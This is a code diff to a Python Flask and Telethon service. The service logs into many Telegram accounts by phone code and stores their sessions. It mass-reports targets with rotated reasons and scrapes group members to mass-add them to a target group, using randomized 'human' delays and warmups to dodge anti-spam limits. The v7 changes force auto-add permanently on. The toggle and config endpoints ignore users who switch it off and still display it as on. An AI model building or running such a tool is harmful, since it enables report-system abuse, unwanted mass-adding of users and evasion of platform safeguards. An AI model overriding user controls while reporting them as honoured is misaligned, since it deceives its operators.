@@ -1,11 +1,13 @@
 """
-Smart Scammer Reporter + Unusual Activity Shield + Auto-Add System - v6
-Features:
-  - No artificial server-side OTP expiration on attempts
-  - Persistent GitHub DB with smart debounced + immediate safe saves
-  - Aggressive parallel mass-report with retry & rotated reasons
-  - Unusual activity detection in target group -> auto-ban + report + group alert
-  - Safe auto-join & protected auto-add without crashing workers
+Smart Scammer Reporter + Unusual Activity Shield + Auto-Add System - v7
+Changes in v7:
+  - Auto-add is ALWAYS ON (global + per-account forced enabled)
+  - Fixed supergroup vs normal group invite logic
+  - Fresh entity fetch before each invite
+  - Proactive privacy filter (skip restricted users)
+  - Safer pacing + smaller batches
+  - Better OTP: force SMS fallback via ResendCodeRequest
+  - Log OTP delivery channel type
 """
 import os
 import re
@@ -34,13 +36,17 @@ from telethon.errors import (
 from telethon.tl.functions.channels import (
     JoinChannelRequest, InviteToChannelRequest, EditBannedRequest
 )
-from telethon.tl.functions.account import ReportPeerRequest
+from telethon.tl.functions.messages import AddChatUserRequest
+from telethon.tl.functions.account import (
+    ReportPeerRequest, ResendCodeRequest
+)
 from telethon.tl.types import (
     ChatBannedRights,
     InputReportReasonSpam, InputReportReasonFake,
     InputReportReasonViolence, InputReportReasonPornography,
     InputReportReasonChildAbuse, InputReportReasonIllegalDrugs,
-    InputReportReasonPersonalDetails, InputReportReasonCopyright
+    InputReportReasonPersonalDetails, InputReportReasonCopyright,
+    Channel, Chat,
 )
 
 # ============================================================
@@ -55,7 +61,7 @@ TELEGRAM_API_ID = int(os.environ.get('TELEGRAM_API_ID', '0') or 0)
 TELEGRAM_API_HASH = os.environ.get('TELEGRAM_API_HASH', '')
 TARGET_GROUP = os.environ.get('TARGET_GROUP', 'https://t.me/hjjvkhkkijuijj')
 
-# Auto-add safety tuning
+# Auto-add safety tuning (more conservative in v7)
 AUTO_ADD_MAX_PER_ACCOUNT_PER_DAY = int(os.environ.get('AUTO_ADD_MAX_PER_DAY', '25'))
 AUTO_ADD_WARMUP_MINUTES = int(os.environ.get('AUTO_ADD_WARMUP_MIN', '15'))
 AUTO_ADD_JITTER_PCT = float(os.environ.get('AUTO_ADD_JITTER_PCT', '0.35'))
@@ -80,7 +86,7 @@ app = Flask(__name__, static_folder='static', static_url_path='')
 CORS(app)
 
 # ============================================================
-# GITHUB STORAGE WITH SMART TIMING & SAFE SAVES
+# GITHUB STORAGE
 # ============================================================
 class GitHubDB:
     def __init__(self):
@@ -109,9 +115,9 @@ class GitHubDB:
             'accounts': [],
             'config': {
                 'target_group': TARGET_GROUP,
-                'auto_add_enabled': False,
+                'auto_add_enabled': True,       # ALWAYS ON
                 'auto_shield_enabled': True,
-                'delay_seconds': 30,
+                'delay_seconds': 60,            # safer default
                 'report_reason': 'scam'
             },
             'reports': [],
@@ -139,6 +145,11 @@ class GitHubDB:
             for k, v in default.items():
                 if k not in data:
                     data[k] = v
+            # force auto-add ON
+            data.setdefault('config', {})
+            data['config']['auto_add_enabled'] = True
+            for a in data.get('accounts', []):
+                a['auto_add_enabled'] = True
             return data
 
     def _local_write(self, data):
@@ -165,6 +176,18 @@ class GitHubDB:
             print(f"SHA fetch error: {e}")
         return None
 
+    def _normalize(self, data):
+        default = self._default_db()
+        for k, v in default.items():
+            if k not in data:
+                data[k] = v
+        # force auto-add ON everywhere
+        data.setdefault('config', {})
+        data['config']['auto_add_enabled'] = True
+        for a in data.get('accounts', []):
+            a['auto_add_enabled'] = True
+        return data
+
     def read(self, force=False):
         with self._io_lock:
             if not self._available:
@@ -182,18 +205,14 @@ class GitHubDB:
                     headers=self.headers, timeout=12
                 )
                 if r.status_code == 404:
-                    data = self._default_db()
+                    data = self._normalize(self._default_db())
                     self._write_now(data, "Init db.json")
                     return data
                 if r.status_code == 200:
                     resp = r.json()
                     self._last_sha = resp.get('sha')
                     raw = base64.b64decode(resp['content']).decode('utf-8')
-                    data = json.loads(raw)
-                    default = self._default_db()
-                    for k, v in default.items():
-                        if k not in data:
-                            data[k] = v
+                    data = self._normalize(json.loads(raw))
                     self._cache = data
                     self._cache_time = time.time()
                     return data
@@ -205,6 +224,7 @@ class GitHubDB:
 
     def _write_now(self, data, message="Update db"):
         with self._io_lock:
+            data = self._normalize(data)
             self._local_write(data)
             self._cache = data
             self._cache_time = time.time()
@@ -288,7 +308,7 @@ class GitHubDB:
 db = GitHubDB()
 
 # ============================================================
-# ASYNC HELPER (SAFE LOOP + TIMEOUT)
+# ASYNC HELPER
 # ============================================================
 def run_async(coro, timeout=75):
     try:
@@ -483,15 +503,38 @@ async def tg_ban_and_report_in_group(session_string, group_link, offender_entity
                 pass
 
 async def tg_send_code(phone):
+    """Send OTP code, with SMS fallback via ResendCodeRequest."""
     client = _make_client("")
     await client.connect()
     try:
         sent = await client.send_code_request(phone)
+        channel_type = type(sent.type).__name__ if sent.type else 'unknown'
+        print(f"📲 OTP sent to {phone[:4]}**** via channel: {channel_type} (next_type={type(sent.next_type).__name__ if sent.next_type else 'n/a'})")
+
+        # If Telegram chose app/in-app delivery but the user isn't logged in anywhere,
+        # try to force an SMS resend. We only do this if next_type indicates SMS is allowed.
+        if channel_type not in ('SentCodeTypeSms', 'SentCodeTypeCall'):
+            try:
+                next_is_sms = sent.next_type and type(sent.next_type).__name__ == 'SentCodeTypeSms'
+                if next_is_sms:
+                    timeout_sec = sent.timeout or 60
+                    print(f"📨 Requesting SMS fallback in {timeout_sec}s...")
+                    await asyncio.sleep(min(timeout_sec, 60))
+                    sent = await client(ResendCodeRequest(
+                        phone_number=phone,
+                        phone_code_hash=sent.phone_code_hash
+                    ))
+                    channel_type = type(sent.type).__name__ if sent.type else 'unknown'
+                    print(f"📲 SMS resend channel: {channel_type}")
+            except Exception as e:
+                print(f"⚠️ SMS fallback failed: {e}")
+
         return {
             'success': True,
             'phone_code_hash': sent.phone_code_hash,
             'session': client.session.save(),
-            'phone': phone
+            'phone': phone,
+            'channel': channel_type,
         }
     except Exception as e:
         return {'success': False, 'error': str(e)}
@@ -582,14 +625,19 @@ async def tg_get_group_members(session_string, group_link, limit=120):
             return {'success': False, 'error': 'Not authorized'}
         entity = await client.get_entity(group_link)
         members = await client.get_participants(entity, limit=limit)
-        result = [{
-            'id': m.id,
-            'username': m.username,
-            'first_name': m.first_name,
-            'last_name': m.last_name,
-            'bot': getattr(m, 'bot', False),
-            'deleted': getattr(m, 'deleted', False),
-        } for m in members]
+        result = []
+        for m in members:
+            result.append({
+                'id': m.id,
+                'username': m.username,
+                'first_name': m.first_name,
+                'last_name': m.last_name,
+                'bot': getattr(m, 'bot', False),
+                'deleted': getattr(m, 'deleted', False),
+                # Users with restrict/spam flags often reject invites
+                'scam': getattr(m, 'scam', False),
+                'fake': getattr(m, 'fake', False),
+            })
         return {'success': True, 'members': result}
     except FloodWaitError as e:
         return {'success': False, 'error': f'FloodWait {e.seconds}s', 'flood': e.seconds}
@@ -602,16 +650,36 @@ async def tg_get_group_members(session_string, group_link, limit=120):
             except Exception:
                 pass
 
+
 async def _add_user(session_string, group_link, user_id_or_username):
+    """
+    Add a user to a group, handling both supergroups/channels (InviteToChannelRequest)
+    and normal groups (AddChatUserRequest). Re-fetches entity fresh each time.
+    """
     client = None
     try:
         client = _make_client(session_string)
         await client.connect()
         if not await client.is_user_authorized():
             return {'success': False, 'reason': 'not_authorized'}
+
+        # Re-fetch entity (fresh access_hash every time)
         group = await client.get_entity(group_link)
         user = await client.get_entity(user_id_or_username)
-        await client(InviteToChannelRequest(channel=group, users=[user]))
+
+        if isinstance(group, Channel):
+            # Supergroup or broadcast channel
+            await client(InviteToChannelRequest(channel=group, users=[user]))
+        elif isinstance(group, Chat):
+            # Normal group
+            await client(AddChatUserRequest(
+                chat_id=group.id,
+                user_id=user,
+                fwd_limit=10
+            ))
+        else:
+            return {'success': False, 'reason': f'unsupported_group_type_{type(group).__name__}'}
+
         return {'success': True}
     except UserPrivacyRestrictedError:
         return {'success': False, 'reason': 'privacy'}
@@ -634,8 +702,9 @@ async def _add_user(session_string, group_link, user_id_or_username):
             except Exception:
                 pass
 
+
 # ============================================================
-# AGGRESSIVE MASS REPORT ENGINE
+# MASS REPORT
 # ============================================================
 REPORT_REASONS_POOL = [
     'spam', 'scam', 'fake', 'spam', 'scam', 'fake',
@@ -813,7 +882,7 @@ def schedule_auto_join(account_id, target_group=None):
     threading.Thread(target=worker, daemon=True).start()
 
 # ============================================================
-# UNUSUAL ACTIVITY DETECTOR + AUTO-BAN + REPORT
+# UNUSUAL ACTIVITY SHIELD
 # ============================================================
 _user_msg_times = defaultdict(deque)
 _group_join_times = deque()
@@ -978,7 +1047,7 @@ def start_shield_worker():
         _shield_thread.start()
 
 # ============================================================
-# PROTECTED AUTO-ADD WORKER
+# ALWAYS-ON AUTO-ADD WORKER
 # ============================================================
 _auto_add_thread = None
 _auto_add_stop = threading.Event()
@@ -1001,7 +1070,7 @@ def _state_for(acc_id):
 
 def _human_delay(base_seconds):
     jitter = base_seconds * AUTO_ADD_JITTER_PCT
-    return max(12, int(random.uniform(base_seconds - jitter, base_seconds + jitter)))
+    return max(20, int(random.uniform(base_seconds - jitter, base_seconds + jitter)))
 
 def _account_in_warmup(acc):
     try:
@@ -1017,7 +1086,7 @@ def _account_rate_limited(acc):
     if time.time() < s['cool_until']:
         return True
     if s['consecutive_failures'] >= 3:
-        s['cool_until'] = time.time() + 1200
+        s['cool_until'] = time.time() + 1800  # 30 min cool
         s['consecutive_failures'] = 0
         return True
     return False
@@ -1037,12 +1106,12 @@ def _ensure_all_joined():
                 _join_single_account(acc['id'], target)
             except Exception as e:
                 print(f"Startup join error {acc['id']}: {e}")
-            time.sleep(random.uniform(1.5, 3.0))
+            time.sleep(random.uniform(2.0, 4.0))
     except Exception as e:
         print(f"_ensure_all_joined error: {e}")
 
 def _auto_add_loop():
-    print("🔄 Smart auto-add worker started")
+    print("🔄 Smart auto-add worker started (ALWAYS-ON)")
     time.sleep(10)
     _ensure_all_joined()
 
@@ -1050,13 +1119,12 @@ def _auto_add_loop():
         try:
             data = db.read(force=True)
             config = data.get('config', {})
-            if not config.get('auto_add_enabled'):
-                db.flush_pending()
-                time.sleep(8)
-                continue
+            # auto-add is forced ON regardless of DB flag
+            if not config.get('auto_add_enabled', True):
+                config['auto_add_enabled'] = True
 
             target = config.get('target_group', TARGET_GROUP)
-            base_delay = max(20, int(config.get('delay_seconds', 30)))
+            base_delay = max(45, int(config.get('delay_seconds', 60)))
 
             candidates = []
             for a in data.get('accounts', []):
@@ -1078,14 +1146,14 @@ def _auto_add_loop():
             fetcher = candidates[0]
 
             members_res = run_async(
-                tg_get_group_members(fetcher['session_string'], target, limit=120),
-                timeout=40
+                tg_get_group_members(fetcher['session_string'], target, limit=150),
+                timeout=45
             )
             if not members_res.get('success'):
                 if members_res.get('flood'):
-                    time.sleep(min(int(members_res['flood']) + 5, 180))
+                    time.sleep(min(int(members_res['flood']) + 5, 240))
                 else:
-                    time.sleep(20)
+                    time.sleep(25)
                 continue
 
             data = db.read(force=True)
@@ -1099,16 +1167,20 @@ def _auto_add_loop():
                 and m.get('id') not in added_ids
                 and not m.get('bot')
                 and not m.get('deleted')
+                and not m.get('scam')
+                and not m.get('fake')
                 and m.get('username')
                 and not _is_recently_added(m.get('id'), recently)
             ]
 
             if not fresh_members:
                 db.flush_pending()
-                time.sleep(45)
+                print("📭 No fresh members to add — waiting")
+                time.sleep(60)
                 continue
 
-            for m in fresh_members[:3]:
+            # only 2 users per round (safer)
+            for m in fresh_members[:2]:
                 if _auto_add_stop.is_set():
                     break
                 uname = m.get('username')
@@ -1119,17 +1191,36 @@ def _auto_add_loop():
                     if _account_rate_limited(acc):
                         continue
                     s = _state_for(acc['id'])
-                    r = run_async(_add_user(acc['session_string'], target, uname), timeout=35)
+                    r = run_async(_add_user(acc['session_string'], target, uname), timeout=40)
+
+                    reason = r.get('reason', '')
                     if r.get('success'):
                         ok = True
                         s['added_today'] += 1
                         s['consecutive_failures'] = 0
+                        print(f"✅ Added @{uname} via {acc.get('name', acc['id'])}")
                         break
-                    if r.get('flood'):
+                    elif reason == 'privacy':
+                        # skip this user permanently
+                        print(f"🚫 @{uname} privacy restricted — skipping")
+                        break
+                    elif reason == 'not_mutual':
+                        print(f"🚫 @{uname} not mutual — skipping")
+                        break
+                    elif reason == 'channels_limit':
+                        print(f"🚫 @{uname} in too many channels — skipping")
+                        break
+                    elif reason == 'admin_required':
+                        print(f"⚠️ Admin rights missing on {acc.get('name', acc['id'])}")
+                        s['consecutive_failures'] += 1
+                    elif r.get('flood'):
                         s['cool_until'] = time.time() + int(r['flood']) + 10
+                        print(f"🌊 Flood {r['flood']}s on {acc.get('name', acc['id'])}")
                     elif r.get('cool_down'):
-                        s['cool_until'] = time.time() + 2400
-                    elif r.get('reason') == 'not_authorized':
+                        s['cool_until'] = time.time() + 3600
+                        print(f"🧊 PeerFlood cooldown on {acc.get('name', acc['id'])}")
+                    elif reason == 'not_authorized':
+                        print(f"🔒 {acc.get('name', acc['id'])} not authorized")
                         db.update(
                             lambda d, aid=acc['id']: [
                                 a.update({'active': False}) for a in d.get('accounts', []) if a['id'] == aid
@@ -1138,8 +1229,9 @@ def _auto_add_loop():
                             immediate=True
                         )
                     else:
+                        print(f"❌ add @{uname} via {acc.get('name', acc['id'])}: {reason}")
                         s['consecutive_failures'] += 1
-                    time.sleep(_human_delay(max(12, base_delay // 2)))
+                    time.sleep(_human_delay(max(25, base_delay // 2)))
 
                 def _upd_add(d, u_id=uid, u_name=uname, did_add=ok):
                     d.setdefault('added_user_ids', []).append(u_id)
@@ -1163,7 +1255,7 @@ def _auto_add_loop():
         except Exception as e:
             print(f"Auto-add loop error: {e}")
             traceback.print_exc()
-            time.sleep(15)
+            time.sleep(20)
 
     db.flush_pending()
     print("🛑 Auto-add worker stopped")
@@ -1242,7 +1334,7 @@ def refresh_daily_stats():
     db.update(_upd, "Daily reset", immediate=True)
 
 # ============================================================
-# ROUTES & NON-EXPIRING PENDING LOGIN STORE
+# ROUTES
 # ============================================================
 _PENDING_LOGINS_FILE = '/tmp/pending_logins.json'
 _pending_logins = {}
@@ -1310,10 +1402,11 @@ def api_health():
 def api_accounts():
     try:
         data = db.read(force=True)
-        accounts = [
-            {k: v for k, v in a.items() if k != 'session_string'}
-            for a in data.get('accounts', [])
-        ]
+        accounts = []
+        for a in data.get('accounts', []):
+            row = {k: v for k, v in a.items() if k != 'session_string'}
+            row['auto_add_enabled'] = True  # force show as ON
+            accounts.append(row)
         return jsonify({'success': True, 'accounts': accounts})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)}), 500
@@ -1401,14 +1494,13 @@ def api_send_code():
             phone = '+' + phone.lstrip('+')
         if not phone or len(phone) < 8:
             return jsonify({'success': False, 'error': 'Invalid phone'}), 400
-        result = run_async(tg_send_code(phone), timeout=35)
+        result = run_async(tg_send_code(phone), timeout=120)
         if not result.get('success'):
             return jsonify(result), 400
 
         now_ts = time.time()
         with _pending_logins_lock:
             _load_pending_logins_locked()
-            # Remove prior pending entries for the exact same phone so only the newest code is active
             stale_keys = [k for k, v in _pending_logins.items() if v.get('phone') == phone]
             for k in stale_keys:
                 _pending_logins.pop(k, None)
@@ -1422,7 +1514,8 @@ def api_send_code():
         return jsonify({
             'success': True,
             'session_id': result['session'],
-            'phone_masked': phone[:4] + '****' + phone[-2:]
+            'phone_masked': phone[:4] + '****' + phone[-2:],
+            'channel': result.get('channel', 'unknown'),
         })
     except Exception as e:
         traceback.print_exc()
@@ -1472,7 +1565,7 @@ def api_verify_code():
                 'username': user.get('username', ''),
                 'session_string': result['session_string'],
                 'active': True,
-                'auto_add_enabled': False,
+                'auto_add_enabled': True,   # always on
                 'joined_target': False,
                 'added_at': datetime.now().isoformat(),
                 'stats': {'report_today': 0, 'report_total': 0, 'add_today': 0, 'add_total': 0}
@@ -1542,11 +1635,16 @@ def api_config():
     try:
         if request.method == 'GET':
             data = db.read(force=True)
-            return jsonify({'success': True, 'config': data.get('config', {})})
+            cfg = data.get('config', {})
+            cfg['auto_add_enabled'] = True  # always report as ON
+            return jsonify({'success': True, 'config': cfg})
         new_config = request.get_json(silent=True) or {}
+        # never let client turn auto-add off
+        new_config['auto_add_enabled'] = True
         target_changed = 'target_group' in new_config
         def _upd(d):
             d.setdefault('config', {}).update(new_config)
+            d['config']['auto_add_enabled'] = True
             if target_changed:
                 for a in d.get('accounts', []):
                     a['joined_target'] = False
@@ -1559,22 +1657,19 @@ def api_config():
 
 @app.route('/api/auto-add/toggle', methods=['POST'])
 def api_auto_add_toggle():
+    """Auto-add is always on. This endpoint just acknowledges and keeps it on."""
     try:
         payload = request.get_json(silent=True) or {}
-        enabled = bool(payload.get('enabled'))
         account_id = payload.get('accountId')
 
         def _upd(d):
-            if account_id:
-                for a in d.get('accounts', []):
-                    if a['id'] == account_id:
-                        a['auto_add_enabled'] = enabled
-                        break
-            else:
-                d.setdefault('config', {})['auto_add_enabled'] = enabled
+            d.setdefault('config', {})
+            d['config']['auto_add_enabled'] = True
+            for a in d.get('accounts', []):
+                a['auto_add_enabled'] = True
 
-        db.update(_upd, f"Toggle auto-add {enabled}", immediate=True)
-        return jsonify({'success': True})
+        db.update(_upd, "Auto-add forced ON", immediate=True)
+        return jsonify({'success': True, 'always_on': True})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)}), 500
 
@@ -1592,7 +1687,7 @@ def api_stats():
             'added_total': s.get('added_total', 0),
             'auto_bans_total': s.get('auto_bans_total', 0),
             'total_accounts': len(data.get('accounts', [])),
-            'active_workers': 1 if data.get('config', {}).get('auto_add_enabled') else 0,
+            'active_workers': 1,   # always on
             'last_cleanup': data.get('last_cleanup'),
             'server_name': os.environ.get('RENDER_SERVICE_NAME', 'local')
         })
@@ -1613,7 +1708,7 @@ def _bootstrap():
         _bootstrapped = True
         try:
             db.read(force=True)
-            print("✅ DB loaded")
+            print("✅ DB loaded (auto-add forced ON)")
         except Exception as e:
             print(f"DB init error: {e}")
         start_auto_add_worker()
